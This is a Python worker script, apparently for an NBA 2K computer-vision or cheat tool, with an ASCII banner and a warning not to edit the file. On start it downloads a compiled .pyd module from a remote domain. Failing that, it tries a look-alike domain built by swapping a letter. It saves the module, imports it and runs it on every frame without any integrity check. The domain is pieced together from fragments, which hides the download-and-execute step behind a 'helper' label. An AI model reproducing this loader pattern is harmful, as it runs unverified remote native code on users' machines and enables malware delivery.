'''

WELCOME TO


 ___    __  ___    ____    ____  __       _______. __    ______   .__   __. 
|__ \  |  |/  /    \   \  /   / |  |     /       ||  |  /  __  \  |  \ |  | 
   ) | |  '  /      \   \/   /  |  |    |   (----`|  | |  |  |  | |   \|  | 
  / /  |    <        \      /   |  |     \   \    |  | |  |  |  | |  . `  | 
 / /_  |  .  \        \    /    |  | .----)   |   |  | |  `--'  | |  |\   | 
|____| |__|\__\        \__/     |__| |_______/    |__|  \______/  |__| \__|
 
 
.__   __. .______        ___       ___    __  ___ 
|  \ |  | |   _  \      /   \     |__ \  |  |/  / 
|   \|  | |  |_)  |    /  ^  \       ) | |  '  /  
|  . `  | |   _  <    /  /_\  \     / /  |    <   
|  |\   | |  |_)  |  /  _____  \   / /_  |  .  \  
|__| \__| |______/  /__/     \__\ |____| |__|\__\ 


'''

# DO NOT CHANGE ANYTHING IN THIS FILE
import os
import sys
import requests

class GCVWorker:
    def __init__(self, width, height):
        os.chdir(os.path.dirname(__file__))
        self.hp = "helios2_helper"
        python_version = self.get_python_version()
        helper_file_name = f"{self.hp}.cp{python_version}-win_amd64.pyd"
        domain = "inputsense"
        subdomain = 'helios'
        files = 'helios2'

        if not self.hp + '.py' in os.listdir(os.getcwd()):
            self.download_file(helper_file_name, domain, subdomain, files)
        self.hp = __import__(self.hp)
        self.hp = self.hp.Helper()

    def __del__(self):
        del self.hp

    def process(self, frame):
        return self.hp.run(frame)

    def download_file(self, file_name, domain, subdomain, files):
        destination_path = os.path.dirname(__file__)
        base_url = f"https://{subdomain}.{domain}.com/{files}/"
        try:
            fr = requests.get(base_url + file_name, timeout=6)
            fr.raise_for_status()
        except requests.RequestException:
            print("URL unreachable, trying backup...")
            try:
                domain = domain.replace('i', 'l')
                fr = requests.get(f"https://{subdomain}.{domain}.com/{files}/" + file_name, timeout=6)
                fr.raise_for_status()
            except requests.RequestException:
                raise Exception("Backup failed.")

        if len(fr.content) > 2048:
            with open(os.path.join(destination_path, file_name), 'wb') as dl:
                dl.write(fr.content)
        else:
            raise Exception("Helper download failed. Could not reach server.")

    def get_python_version(self):
        # For Python 3.11, the CPython tag is "311"
        return f"{sys.version_info.major}{sys.version_info.minor}"
class Helper:
    def run(self, frame):
        # Do processing here
        print("Running Helper with frame:", frame)
        return "processed"
